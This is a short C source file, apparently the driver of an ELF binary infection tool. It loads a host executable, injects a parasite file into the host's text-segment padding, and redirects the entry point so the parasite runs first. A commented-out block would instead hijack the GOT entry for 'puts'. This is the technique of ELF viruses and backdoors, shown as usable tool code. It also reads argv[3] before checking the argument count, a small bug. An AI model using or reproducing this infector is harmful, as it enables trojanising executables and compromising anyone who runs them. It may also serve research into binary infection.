#include "elfit.h"

/* currently just a wrapper for posttext inject */
int main(int argc, char *argv[])
{
    unsigned long entry;
    uint32_t patch_position;
    Elfit_t host;
    Elf32_Addr got;

    patch_position = atoi(argv[3]);

    if (argc < 4)
    {
        printf("usage: %s <host> <parasite> <patch_position>\n", argv[0]);
        exit(1);
    }

    /* TODO Integrity check host for section header table */

    load_host(argv[1], &host);

    /* PATCH TO (ENTRY [NULL], X) */
    entry = textpadding_inject_64(&host, argv[2], patch_position, 0);
    reload_host(argv[1], &host);
    
    entry_redirect_64(&host, entry);

    /*
    if ((got = got_redirect_64(&host, "puts", entry)) == -1)
    {
        printf("Couldn't find symbol\n");
        exit(-1);
    }
    */
}
